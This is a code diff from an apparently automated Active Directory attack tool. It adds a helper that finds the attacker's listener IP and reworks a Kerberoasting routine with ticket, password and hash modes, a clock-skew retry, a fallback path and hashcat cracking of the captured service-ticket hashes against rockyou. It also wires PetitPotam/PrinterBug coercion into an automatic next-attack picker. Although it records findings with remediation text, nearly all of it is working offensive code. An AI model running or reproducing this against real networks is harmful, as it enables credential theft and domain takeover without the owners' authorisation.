@@ -932,11 +932,36 @@ def _known_gmsa_accounts() -> list[str]:
     return names
 
 
+def _attacker_ip() -> str:
+    """Return configured listener IP, or infer it from attacker_iface."""
+    ip = str(SESSION.get("attacker_ip") or "").strip()
+    if ip:
+        return ip
+    iface = str(SESSION.get("attacker_iface") or "").strip()
+    if not iface:
+        return ""
+    try:
+        out = subprocess.check_output(
+            ["ip", "-4", "-o", "addr", "show", "dev", iface],
+            text=True,
+            stderr=subprocess.DEVNULL,
+            timeout=2,
+        )
+    except Exception:
+        return ""
+    m = re.search(r"\binet\s+(\d+\.\d+\.\d+\.\d+)/", out)
+    if not m:
+        return ""
+    ip = m.group(1)
+    SESSION["attacker_ip"] = ip
+    return ip
+
+
 def _shell_export_prefix() -> list[str]:
     dc = SESSION.get("dc_ip", "<dc_ip>")
     dom = SESSION.get("domain", "<domain>")
     dc_fqdn = _dc_host_for_kerberos(dom, dc) if dom and dc else "<dc_fqdn>"
-    attacker = SESSION.get("attacker_ip", "<attacker_ip>")
+    attacker = _attacker_ip() or "<attacker_ip>"
     return [
         f"export DC_IP={dc}",
         f"export DOMAIN={dom}",
@@ -4452,46 +4477,93 @@ def tool_asrep_roast(dc_ip: str, domain: str, username: str = "",
 
 def tool_kerberoast(dc_ip: str, domain: str, username: str,
                     password: str = "", nt_hash: str = "") -> str:
+    password = _real_secret(password) or _real_secret(SESSION.get("password", ""))
+    nt_hash = _real_nt_hash(nt_hash) or _real_nt_hash(SESSION.get("nt_hash", ""))
     out_file = str(_runtime_path("agent_kerberoast.txt"))
-    krb     = _session_kerberos_usable(username, domain)
     ntlm_off = SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")
     dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
     ft = _faketime_prefix()
     # Use with_faketime=True so env vars are passed via env(1), not as shell prefixes
     get_spns = _impacket_cmd("GetUserSPNs", with_faketime=bool(ft))
-    if krb:
+
+    def _kerberos_cmd() -> str:
         ccache = SESSION["krb5_ccache"]
         os.environ["KRB5CCNAME"] = ccache
-        cmd = (f"KRB5CCNAME={shell_quote(ccache)} {ft}{get_spns} {domain}/{username} "
-               f"-k -no-pass -dc-ip {dc_ip} -dc-host {dc_fqdn} "
-               f"-request -outputfile {out_file}")
+        return (f"KRB5CCNAME={shell_quote(ccache)} {ft}{get_spns} {domain}/{username} "
+                f"-k -no-pass -dc-ip {dc_ip} -dc-host {dc_fqdn} "
+                f"-request -outputfile {out_file}")
+
+    def _password_cmd() -> str:
+        return (f"env -u KRB5CCNAME {get_spns} {domain}/{username}:{shell_quote(password)} "
+                f"-dc-ip {dc_ip} -dc-host {dc_fqdn} "
+                f"-request -outputfile {out_file}")
+
+    def _hash_cmd() -> str:
+        return (f"env -u KRB5CCNAME {get_spns} {domain}/{username} "
+                f"-hashes :{nt_hash.split(':')[-1]} -dc-ip {dc_ip} -dc-host {dc_fqdn} "
+                f"-request -outputfile {out_file}")
+
+    def _read_hashes() -> list:
+        if not Path(out_file).exists():
+            return []
+        return [l for l in Path(out_file).read_text(errors="ignore").splitlines()
+                if l.startswith("$krb5tgs")]
+
+    def _format_success(hashes: list) -> str:
+        cracked_file = _runtime_path("agent_krb_cracked.txt")
+        _run(f"hashcat -m 13100 {shell_quote(out_file)} /usr/share/wordlists/rockyou.txt "
+             f"--force -o {shell_quote(str(cracked_file))} -q 2>/dev/null", timeout=120)
+        cracked = cracked_file.read_text(errors="ignore") if cracked_file.exists() else ""
+        add_finding("Kerberoastable Accounts", "High",
+                    f"{len(hashes)} service accounts with SPNs",
+                    "Use gMSA; set 25+ char passwords on service accounts")
+        return f"Kerberoast hashes ({len(hashes)}):\n{chr(10).join(hashes[:3])}\nCracked: {cracked[:500] or 'None yet'}"
+
+    krb = _session_kerberos_usable(username, domain)
+    if krb:
+        cmd = _kerberos_cmd()
+    elif nt_hash:
+        cmd = _hash_cmd()
+    elif password and not ntlm_off:
+        # Keep the older password-auth Kerberoast path; it often succeeds before
+        # a Kerberos-only pivot is needed and preserves hash output for cracking.
+        cmd = _password_cmd()
     elif ntlm_off:
         return ("Kerberoast skipped: NTLM is disabled and no Kerberos ticket available. "
                 "Run request_tgt first.")
-    elif nt_hash:
-        cmd = (f"{get_spns} {domain}/{username} "
-               f"-hashes :{nt_hash.split(':')[-1]} -dc-ip {dc_ip} -dc-host {dc_fqdn} "
-               f"-request -outputfile {out_file}")
     else:
-        cmd = (f"{get_spns} {domain}/{username}:'{password}' "
-               f"-dc-ip {dc_ip} -dc-host {dc_fqdn} "
-               f"-request -outputfile {out_file}")
+        return "Kerberoast skipped: no password/hash or usable Kerberos ticket available."
+
     out = _run(cmd, timeout=60)
-    hashes = []
-    if Path(out_file).exists():
-        hashes = [l for l in Path(out_file).read_text().splitlines()
-                  if l.startswith("$krb5tgs")]
+    hashes = _read_hashes()
+    if hashes:
+        return _format_success(hashes)
+
+    if (("KRB_AP_ERR_SKEW" in out or "Clock skew too great" in out)
+            and password):
+        repair = tool_request_tgt(dc_ip, domain, username, password, nt_hash)
+        if _session_kerberos_usable(username, domain):
+            retry_out = _run(_kerberos_cmd(), timeout=60)
+            hashes = _read_hashes()
+            if hashes:
+                return _format_success(hashes)
+            return (f"Kerberoast result after clock-skew repair:\n"
+                    f"{out[:700]}\n\n=== request_tgt repair ===\n{repair[:700]}\n\n"
+                    f"=== Kerberos retry ===\n{retry_out[:1000]}\nNo SPN hashes captured.")
+        return (f"Kerberoast hit clock skew and TGT repair failed:\n"
+                f"{out[:700]}\n\n=== request_tgt repair ===\n{repair[:1000]}")
+
+    # If Kerberos mode produced no hash but NTLM/password auth is still available,
+    # fall back to the legacy path that was successful in the older tree.
+    if krb and not ntlm_off and (password or nt_hash):
+        fallback_cmd = _hash_cmd() if nt_hash else _password_cmd()
+        fallback_out = _run(fallback_cmd, timeout=60)
+        hashes = _read_hashes()
         if hashes:
-            cracked_file = _runtime_path("agent_krb_cracked.txt")
-            crack = _run(f"hashcat -m 13100 {shell_quote(out_file)} /usr/share/wordlists/rockyou.txt "
-                        f"--force -o {shell_quote(str(cracked_file))} -q 2>/dev/null", timeout=120)
-            cracked = ""
-            if cracked_file.exists():
-                cracked = cracked_file.read_text()
-            add_finding("Kerberoastable Accounts", "High",
-                        f"{len(hashes)} service accounts with SPNs",
-                        "Use gMSA; set 25+ char passwords on service accounts")
-            return f"Kerberoast hashes ({len(hashes)}):\n{chr(10).join(hashes[:3])}\nCracked: {cracked[:500] or 'None yet'}"
+            return _format_success(hashes)
+        return (f"Kerberoast result:\n{out[:700]}\n\n"
+                f"=== Password/hash fallback ===\n{fallback_out[:1000]}\nNo SPN hashes captured.")
+
     return f"Kerberoast result:\n{out[:1000]}\nNo SPNs found."
 
 
@@ -7604,12 +7676,12 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
 
 
 def tool_coercion_attack(dc_ip: str, domain: str, username: str,
-                          password: str = "", nt_hash: str = "",
-                          attacker_ip: str = "", method: str = "auto") -> str:
+                         password: str = "", nt_hash: str = "",
+                         attacker_ip: str = "", method: str = "auto") -> str:
     """Coercion attack: PetitPotam / PrinterBug to force DC to authenticate
     to attacker. Captures Net-NTLMv2 or relays to LDAP for Shadow Credentials.
     method: auto | petitpotam | printerbug | dfscoerce"""
-    attacker_ip = attacker_ip or SESSION.get("attacker_ip", "")
+    attacker_ip = attacker_ip or _attacker_ip()
     if not attacker_ip:
         return "Coercion skipped: attacker_ip required (your listener IP)"
 
@@ -9318,10 +9390,11 @@ def _pick_next_tool(completed_tools: list,
             return "timeroast", {"dc_ip": dc, "domain": dom}
         if not _done("pre2k_attack"):
             return "pre2k_attack", {"dc_ip": dc, "domain": dom}
-        if not ntlm_off and SESSION.get("attacker_ip") and not _done("coercion_attack"):
+        _listener_ip = _attacker_ip()
+        if not ntlm_off and _listener_ip and not _done("coercion_attack"):
             return "coercion_attack", {
                 "dc_ip": dc, "domain": dom, "username": "",
-                "password": "", "attacker_ip": SESSION.get("attacker_ip", ""),
+                "password": "", "attacker_ip": _listener_ip,
             }
         # If we got creds from the above, re-enter the main loop
         new_u = SESSION.get("username", "")
@@ -9585,8 +9658,9 @@ def _pick_next_tool(completed_tools: list,
         return "pre2k_attack", {"dc_ip": dc, "domain": dom, "username": u, "password": p}
 
     # Coercion — last resort when attacker_ip is known and NTLM isn't blocked
-    if not ntlm_off and SESSION.get("attacker_ip") and not _done("coercion_attack"):
-        return "coercion_attack", {**creds, "attacker_ip": SESSION.get("attacker_ip", "")}
+    _listener_ip = _attacker_ip()
+    if not ntlm_off and _listener_ip and not _done("coercion_attack"):
+        return "coercion_attack", {**creds, "attacker_ip": _listener_ip}
 
     # ── User hunt — find lateral movement targets before giving up ───────────
     if not _done("user_hunt") and (p or h or krb):
